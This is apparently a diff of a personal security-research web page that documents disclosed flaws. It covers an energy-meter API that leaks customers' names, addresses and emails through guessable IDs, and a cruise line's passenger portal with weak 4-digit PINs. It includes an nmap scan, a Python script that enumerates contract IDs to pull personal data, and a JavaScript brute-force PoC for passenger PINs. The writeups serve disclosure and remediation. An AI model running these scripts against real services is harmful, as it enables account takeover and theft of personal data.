@@ -34,7 +34,10 @@
           }
       }
       window.onload = enforceHTTPS;
-  </script>      
+  </script>        
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
 </head>
 <body>
 
@@ -80,7 +83,7 @@
       <h2><a name="print">INTRO</a></h2>
 
       <p>
-        I'm not a professional full-time security researcher. This section will just function as a log around security and privacy issues I discover in applications and services I use in my day-to-day life.<br/>
+        I'm not a professional full-time security researcher. This section will just function as a log around security and privacy issues I discover in applications and services I use in my day-to-day life.<br /><br />
         Unfortunately none of the affected companies had any Vulnerability Disclosure Program (VDP) in place, so contacting the right department or person wasn't always easy.
         <br /><br />
       </p>
@@ -88,11 +91,181 @@
       <hr />
 
 
-      <h2><a name="energymeter">[2022] Energy Meter: reporting API potentially leaking PII</a></h2>
+      <h2><a name="energymeter">[2022] Energy Meter: reporting API leaking PII</a></h2>
       <p>
-        (in progress)
+        In  2022, I discovered a data privacy issue with an energy meter API leaking PII, when I received the yearly email that asked me to report the current meter values for my apartment online, as shown below.<br /><br />
+        <img src="../img/research/energy/email.png" width="100%"/><br /><br />
+        The API to report the meter (type: EMH eHZ IW8) values is used to report the meter values, but also returns historic meter values from past years as well as some PII like name, postal address and email address of the customer, to then be displayed on the website. <br /><br />
+        <img src="../img/research/energy/meter.jpg" width="100%" /><br /><br />
+
+        The API was not protected with a username/password but simply with with the combination of meter ID (8-digit number) and contract ID (10-digit number). When you live in a multi-family house, you can easily get the meter ID of your neighbors by just looking at the meters next to yours, see photo below.<br /><br />
+        <img src="../img/research/energy/meters.jpg" width="100%" /><br /><br />
+        The API request sequence was as follows:<br /><br />
+        Use the meter ID and contract ID to request a token:
+<pre><code class="language-javascript"><small>
+POST https://api.redacted.de/grid-devicemanagement/zseservice/v1/identification
+Headers
+Ocp-Apim-Subscription-Key: ***********
+Payload:
+{"MeterId":"21175639","ContractAccountNo":"8743122875"}
+</small></code></pre>
+        Note: The Ocip-Subscription-Key was a hardcoded key visible in the websites's requests<br /><br />
+        The response would then contain a token to be used in subsequent requests:<br />
+<pre><code class="language-javascript"><small>
+{
+  "token": "e410805a-****-****-****-************",
+  "allowedNotificationTypes": [1,4,2],
+  "isOnline": true
+}
+</small></code></pre>
+        The meter info can then be retrieved with that token via:
+<pre><code class="language-javascript"><small>
+GET https://api.redacted.de/grid-devicemanagement/zseservice/v1/meterinfo?_=1658482150376
+Authorization: Bearer e410805a-****-****-****-************
+Ocp-Apim-Subscription-Key: ***********
+</small></code class="language-json"></pre>
+        The response would then contain meter history, email address, postal address, name.
+        <img src="../img/research/energy/browser.png" width="100%" /><br /><br />
+  <pre><code class="language-javascript"><small>
+  {
+  "meters": [
+    {
+    "registers": [
+      {
+      "registerId": "001",
+      "historicalReadings": [
+        {
+        "readingReason": "01",
+        "readingValue": 15519.0,
+        "readingDate": "2022-05-17T00:00:00"
+        },
+        {
+        "readingReason": "01",
+        "readingValue": 13193.0,
+        "readingDate": "2021-05-19T00:00:00"
+        },
+        {
+        "readingReason": "01",
+        "readingValue": 10880.0,
+        "readingDate": "2020-05-25T00:00:00"
+        },
+        {
+        "readingReason": "01",
+        "readingValue": 9041.0,
+        "readingDate": "2019-06-13T00:00:00"
+        },
+        {
+        "readingReason": "06",
+        "readingValue": 8056.0,
+        "readingDate": "2019-01-01T00:00:00"
+        }
+      ],
+      "digitsLeftToDecimalPoint": 6,
+      "digitsRightToDecimalPoint": 0,
+      "obisCode": "1-1:1.8.0",
+      "obisCodeDisplay": "1.8.0",
+      "registerType": "NZ",
+      "feedingRegister": false,
+      "billableRegister": true,
+      "useReadingDate": false,
+      "unit": "KWH",
+      "contracts": [
+        {
+        "contractAccountNo": "8743122875",
+        "startDate": "2019-01-01T00:00:00",
+        "endDate": "9999-12-31T00:00:00",
+        "supplierName": " ENERGIE BADEN-WÜRTTEMBERG"
+        }
+      ]
+      }
+    ],
+  "division": "POWER",
+  "meterId": "21175639",
+  "meterStartDate": "2016-01-01T00:00:00",
+  "meterIdDisplay": "21175639",
+  "materialId": "ISEW071",
+  "equipmentId": "808141352",
+  "lockBillingReason": "00",
+  "readingUnit": "JX0612AA",
+  "allowedNotificationTypes": [1,4,2]
+  }
+  ],
+  "address": {
+    "city": "Stuttgart",
+    "district": "Vaihingen",
+    "postalCodeCity": "70569",
+    "street": "Meluner Str.",
+    "houseNumber": "2"
+  },
+  "contact": {
+    "title": "Herr",
+    "firstName": "Mathias",
+    "lastName": "Conradt",
+    "email": "mathias.conradt@******.com",
+    "notificationType": 1
+  },
+  "contactContractAccount": {
+    "title": "Herr",
+    "firstName": "Mathias",
+    "lastName": "Conradt",
+    "email": "mathias.conradt@******.com"
+  }
+}</small></code></pre>
       </p>
 
+      Due to the fact that the API wasn't rate-limited, the backend was direcly server by a Microsoft IIS, the neighbors meter ID known, the only variable was the contract ID that could easily be enumerated. The contract ID being 10 digits long, it would certainly take quite a while to enumerated through it, but definitely possible.<br /><br />
+
+<pre><code class="language-bash"><small>
+$ nmap -sCV -T5 -p80,443 api.redacted.de
+Starting Nmap 7.92 ( https://nmap.org )
+Nmap scan report for api.redacted.de (xxx.xxx.xxx.xxx)
+Host is up (0.00011s latency).
+
+PORT STATE SERVICE VERSION
+80/tcp open upnp Microsoft IIS httpd
+|_http-title: Site doesn't have a title (application/json).
+443/tcp open ssl/upnp Microsoft IIS httpd
+|_ssl-date: 2022-07-31T12:43:28+00:00; 0s from scanner time.
+|_http-title: Site doesn't have a title (application/json).
+| ssl-cert: Subject: commonName=*.redacted.de/organizationName=Redacted
+GmbH/stateOrProvinceName=Baden-W\xC3\xBCrttemberg/countryName=DE
+| Subject Alternative Name: DNS:*.redacted.de, DNS:redacted.de
+| Not valid before: 2022-06-14T00:00:00
+|_Not valid after: 2023-06-19T23:59:59
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 25.69 seconds
+</small></code></pre>
+
+      The following PoC script would achieve this:<br />
+<pre><code class="language-python"><small>
+import requests
+# {"MeterId":"21175639","ContractAccountNo":"8743122875"}
+
+url = 'https://api.redacted.de/grid-devicemanagement/zseservice/v1/identification'
+user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Synedrion/1.2"
+headers = { "User-Agent": user_agent, "Content-Type": "application/json", "Ocp-Apim-Subscription-Key":
+"*********************" }
+found = False
+contract_account_no = 8743121971
+
+while not(found):
+  contract_account_no = contract_account_no + 1
+  print(contract_account_no)
+  json = {"MeterId":"21175637", "ContractAccountNo": str(contract_account_no)}
+  resp = requests.post(url = url, json = json, headers = headers)
+
+  if (resp.json().get('token')):
+    found = True
+    token = resp.json().get('token')
+    print(token)
+    url = 'https://api.redacted.de/grid-devicemanagement/zseservice/v1/meterinfo'
+    headers = { "Authorization": "Bearer " + token, "User-Agent": user_agent, "Content-Type": "application/json",
+    "Ocp-Apim-Subscription-Key": "*********************" }
+
+    resp = requests.get(url = url, headers = headers)
+    print(resp.json())
+</small></code></pre>
       <hr />
 
       <h2><a name="supermarket">[2020] Supermarket: system misconfiguration with bottle vending machine and self-service counters</a></h2>
@@ -132,21 +305,21 @@
       <p>
         The cruise line provides its passengers with name tags that hold full name and cabin number, which are to be attached to checked luggage and brought up to the cabin door BUT put outside the cabin in the hallway. This way, everybody can know passenger name and cabin number.<br />
         <br />
-        <img src="/img/research/cruise1.jpg" height="300"/>
-        <img src="/img/research/cruise2.jpg" height="300"/>
-        <img src="/img/research/cruise3.png" height="200"/>
+        <img src="/img/research/cruise/cruise1.jpg" height="300"/>
+        <img src="/img/research/cruise/cruise2.jpg" height="300"/>
+        <img src="/img/research/cruise/cruise3.png" height="200"/>
       </p>
       <h3>Cabin info at cabin doors</h3>
       <p>
         Cabin mail is put at the cabin door outside. This can also be read by anybody passing by. The mail includes passenger name and cabin number.<br/><br />
-        <img src="/img/research/cruise4.jpg" height="500"/>
-        <img src="/img/research/cruise5.jpg" height="500"/>
+        <img src="/img/research/cruise/cruise4.jpg" height="500"/>
+        <img src="/img/research/cruise/cruise5.jpg" height="500"/>
       </p>
       <h3>Receipts</h3>
       <p>
         Bar receipts also contain passenger full name and cabin number, and are often exposed on the bar counter.<br/><br />
-        <img src="/img/research/cruise6.jpg" height="300"/>
-        <img src="/img/research/cruise7.jpg" height="300"/>
+        <img src="/img/research/cruise/cruise6.jpg" height="300"/>
+        <img src="/img/research/cruise/cruise7.jpg" height="300"/>
       </p>
       <h3>Photo stations</h3>
       <p>
@@ -156,7 +329,7 @@
         I found a specific pattern. The last 2 digits remain fix (01, maybe a passenger classification), so do the first 10 digits (during one trip).
         This means, among passengers, only digits 11-14 differ.<br />
         (Digits 8-10 differ between different trips,  but are the same for all passengers on one particular trip).<br/><br />
-        <img src="/img/research/cruise8.jpg" height="300"/>
+        <img src="/img/research/cruise/cruise8.jpg" height="300"/>
 
         <br /><br />
         Sample barcode values:<br />
@@ -172,15 +345,15 @@
         Knowing this pattern, you can get a barcode generator app like <a href="https://play.google.com/store/apps/details?id=com.blogspot.aeioulabs.barcode&hl=en" target="blank">Barcode Generator</a>, generate ITF barcodes counting up from 0000 to 9999 and replace the digits 11-14 (passenger ID) of your own barcode number with those. The Android app generates barcode right on screen, which you can then use with the photo stations.<br />
         <br />
         The problem within the photo stations is, that they don’t ask you to slide in the card to read the magnetic stripe, but just have an optical reader to scan the barcode.<br /><br />
-        <img src="/img/research/cruise9.jpg" height="400"/>
-        <img src="/img/research/cruise10.jpg" height="400"/>
+        <img src="/img/research/cruise/cruise9.jpg" height="400"/>
+        <img src="/img/research/cruise/cruise10.jpg" height="400"/>
         <br /><br />
         This means, instead of showing your own boarding card, you could just as well show the generated barcode on the Barcode Generator app.<br /><br />
-        <img src="/img/research/cruise11.png" height="400"/>
-        <img src="/img/research/cruise12.png" height="400"/>
+        <img src="/img/research/cruise/cruise11.png" height="400"/>
+        <img src="/img/research/cruise/cruise12.png" height="400"/>
         <br /><br />
         Once successfully scanned, the photo station would show an avatar with the user name on screen.<br /><br />
-        <img src="/img/research/cruise13.jpg" height="500"/><br />
+        <img src="/img/research/cruise/cruise13.jpg" height="500"/><br />
         <br />
         Although time consuming, this is a way to get a list of all passenger names on board.<br />
         <br />
@@ -207,43 +380,42 @@
         This led me to the assumption that the accounts, with the knowledge of a passenger’s lastname and cabin number can be easily brute-forced by testing for all PIN combinations 0000-9999.<br />
         <br />
         Once a passenger account is compromised, one could financially damage a customer by placing orders on his behalf, such as buying and using internet plans (worth up to 119,90 EUR). Furthermore, personal information like the cruise line's club class, purchase history, can be accessed.<br /><br />
-        (PoC provided)<br /><br />
 
         <img src="/img/research/cruise14.png" height="400"/><br /><br />
 
         The PoC code below, run in the browser’s developer console, could achieve this:
-        <pre><code><small>
-          var lastName = 'Conradt';
-          var cabin = '6444';
-          var pinCode = 0 * 1000;
-          var pinCodeStr = '';
-          var pinCodeEnd = 9999;
-          var found = false;
-          document.forms[0].elements[4].value = cabin;
-          document.forms[0].elements[5].value = lastName;
-          var test2 = function() {
-            if ((document.documentElement.textContent ||
-              document.document.innerText).indexOf('fehlgeschlagen') > -1
-              && document.getElementsByClassName('fancybox-overlay')[0]) {
-              console.log('Incorrect: ' + pinCodeStr);
-              document.getElementsByClassName('btn btn-block btn-primary btn-lg')[1].click();
-            }
-            pinCode++;
-          }
-          var test = function() {
-            pinCodeStr = pinCode + '';
-            while (pinCodeStr.length<4) pinCodeStr='0' + pinCodeStr; 
-            document.forms[0].elements[6].value=pinCodeStr;
-            document.forms[0].elements[7].click(); 
-            setTimeout(test2, 4000); 
-            if (!found && pinCode <=pinCodeEnd) setTimeout(test, 6000);
-          } 
-          window.onbeforeunload=function (e) { 
-            console.log('====> Correct: ' + pinCodeStr); 
-            alert('====> Correct: ' + pinCodeStr); 
-          };
-          setTimeout(test, 6000);
-        </small></code></pre>
+<pre><code class="language-javascript"><small>
+var lastName = 'Conradt';
+var cabin = '6444';
+var pinCode = 0 * 1000;
+var pinCodeStr = '';
+var pinCodeEnd = 9999;
+var found = false;
+document.forms[0].elements[4].value = cabin;
+document.forms[0].elements[5].value = lastName;
+var test2 = function() {
+  if ((document.documentElement.textContent ||
+    document.document.innerText).indexOf('fehlgeschlagen') > -1
+    && document.getElementsByClassName('fancybox-overlay')[0]) {
+    console.log('Incorrect: ' + pinCodeStr);
+    document.getElementsByClassName('btn btn-block btn-primary btn-lg')[1].click();
+  }
+  pinCode++;
+}
+var test = function() {
+  pinCodeStr = pinCode + '';
+  while (pinCodeStr.length<4) pinCodeStr='0' + pinCodeStr; 
+  document.forms[0].elements[6].value=pinCodeStr;
+  document.forms[0].elements[7].click(); 
+  setTimeout(test2, 4000); 
+  if (!found && pinCode <=pinCodeEnd) setTimeout(test, 6000);
+} 
+window.onbeforeunload=function (e) { 
+  console.log('====> Correct: ' + pinCodeStr); 
+  alert('====> Correct: ' + pinCodeStr); 
+};
+setTimeout(test, 6000);
+</small></code></pre>
       </p>
       <h3>Provided Recommendations</h3>
       <p>
@@ -252,6 +424,7 @@
           <li>enable brute-force protection, lock accounts (to be unlocked via reception)</li>
           <li>don’t use subsequent numbers for PINS for a passenger and accompanying person</li>
         </ul>        
+        (PoC provided)
       </p>
     </div>
   </div>
